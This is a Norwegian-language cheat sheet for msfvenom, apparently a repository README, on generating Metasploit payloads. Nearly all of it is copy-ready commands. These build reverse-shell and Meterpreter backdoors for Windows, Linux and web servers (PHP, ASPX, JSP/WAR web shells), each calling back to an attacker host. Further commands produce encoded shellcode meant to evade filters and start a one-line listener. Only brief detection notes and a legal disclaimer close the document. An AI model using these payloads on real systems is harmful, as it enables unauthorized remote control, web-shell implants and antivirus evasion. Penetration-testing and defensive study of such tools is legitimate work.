<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formater">
</p>

<p align="center">
  <b>💣 Master jukseark for å generere frittstående nyttelast, shellcode og bakdører på tvers av Windows, Linux, macOS, Android og nettplattformer</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og nyttelastarkitektur](#-oversikt--nyttelast-arkitektur)
  - [Staged vs Stageless Payloads](#staged-vs-stageless-payloads)
- [Viktige flagg og alternativer](#-essensielle-flagg--alternativer)
- [Windows nyttelast (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Linux- og Unix-nyttelaster (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Nett- og nettskallnyttelast (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Shellcode Generation for Exploit Development (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [stripping av dårlige tegn (`-b`)](#stripping-bad-characters--b)
  - [Kodere og flere iterasjoner (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
- [Metasploit Multi-Handler Quick Setup](#-metasploit-multi-handler-quick-setup)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Detection](#-defensive-considerations--detection)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og nyttelastarkitektur

Ved å kombinere de klassiske `msfpayload`- og `msfencode`-verktøyene, genererer **msfvenom** binære kjørbare filer, skript og rå skallkode for utnyttelse og penetrasjonstesting.

### Etappevis vs. trinnløse nyttelaster
- **Iscenesatt (f.eks. `windows/x64/meterpreter/reverse_tcp`):**
  Bruker skråstreker mellom komponenter. En liten stump (trinn 0) kobles tilbake til lytteren og henter den fullstendige reflekterende DLL-filen (trinn 1) inn i minnet. Ideell for utnyttelser med strenge grenser for bufferlengde.
- **Trinnløs (f.eks. `windows/x64/meterpreter_reverse_tcp`):**
  Bruker et understrek (`_`). Hele Meterpreter-nyttelasten er selvstendig inne i den kjørbare filen eller skallkoden. Fungerer pålitelig uten å stole på flertrinns nettverkshåndtrykk, noe som gjør den ideell for kommandolinjeløpere og unnvikende utholdenhet.

---

## ⚙️ Viktige flagg og alternativer
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Flagg | Beskrivelse |
|------|-------------|
| `-p, --payload` | Spesifiserer nyttelasten som skal brukes (`--list payloads` for å se alle). |
| `-f, --format` | Utdataformat (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Shellcode-koder for å eliminere dårlige tegn (`--list encoders`). |
| `-i, --iterations` | Antall kodingspass. |
| `-b, --bad-chars` | Tegn som skal unngås i skallkode (f.eks. `\x00\x0a\x0d`). |
| `-x, --template` | Kjørbar mal for å injisere nyttelast i. |
| `-k, --keep` | Bevarer malens normale utførelse i en ny tråd. |
| `-o, --out` | Utdatadestinasjonsfilbane. |

---

## 🪟 Windows nyttelast (EXE, DLL, MSI, PowerShell)

### Windows x64 Reverse Shell kjørbar (stadieløs)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Windows x64 Stage Reverse TCP-kjørbar
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Windows DLL-injeksjonsnyttelast
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Windows MSI Installer (Privilege Escalation via AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Base64-kodet PowerShell-kommando
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Linux og Unix nyttelast (ELF, Python, Bash)

### Linux x64 ELF binær (stadieløs)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux Standard `/bin/sh` Omvendt TCP (ingen målertolk)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Frittstående Python Reverse Shell Script
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Pure Bash Command String
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Nett- og nettskall-nyttelast (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### Klassisk ASP og ASPX (IIS-servere)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Java WAR-pakke (Apache Tomcat Web Archive)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Shellcode-generering for utnyttelsesutvikling (C, Raw, Python)

### Fjerning av dårlige tegn (`-b`)
Nullbyte (`\x00`), vognretur (`\r` = `\x0d`) og nye linjer (`\n` = `\x0a`) bryter strengbaserte minnekorrupsjonsutnyttelser (f.eks. stabeloverflyt):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Kodere og flere iterasjoner (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Metasploit Multi-Handler Hurtigoppsett

Fang alltid nyttelast med Metasploits `multi/handler`:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Hurtigreferansetabell

| Målplattform | Kommando |
|----------------|--------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Rå skallkode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Defensive vurderinger og gjenkjenning

1. **Statisk signaturdeteksjon:** Standard Msfvenom-maler og -kodere (`shikata_ga_nai`) har velkjente statiske signaturer identifisert av praktisk talt alle moderne antivirusmotorer.
2. **Atferdsmessig EDR-overvåking:** EDR-agenter flagger unormal prosess-gyting (f.eks. `cmd.exe` eller `powershell.exe` skapt under `w3wp.exe` eller `tomcat8.exe`).

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Msfvenom genererer funksjonelle offensive nyttelaster og bakdører. Det må strengt tatt brukes under autoriserte penetrasjonstester og i isolerte laboratorieforskningsmiljøer. Uautorisert generering eller kjøring på tredjepartsdatamaskiner er ulovlig.